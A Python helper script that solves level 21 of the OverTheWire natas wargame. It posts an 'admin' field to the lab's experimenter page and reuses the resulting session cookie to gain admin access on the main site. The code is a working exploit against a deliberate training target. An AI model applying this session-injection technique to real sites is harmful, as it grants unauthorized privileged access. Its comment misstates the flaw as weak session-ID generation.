"""
Help script to resolve natas challenge #21
"""
import requests
import json

level = 'natas21'
url = 'http://{}.natas.labs.overthewire.org/index.php'.format(level)
experimenter = 'http://natas21-experimenter.natas.labs.overthewire.org/'

with open('natas.json') as j:
    credentials = json.load(j)
auth = (level, credentials[level])
del credentials

"""
In this level we perform an attack against a poorly designed algorithm for generating the session ID.
The experimenter page is vulnerable, like the previous levels. We can try to get admin access and
reuse that cookie in the original site.
"""
session = requests.Session()
response = session.post(experimenter,
                        data={"submit": "1", "admin": "1"},
                        auth=auth)
# Recycle the cookie
response = session.get(url, cookies={'PHPSESSID': session.cookies['PHPSESSID']}, auth=auth)
print(response.text)
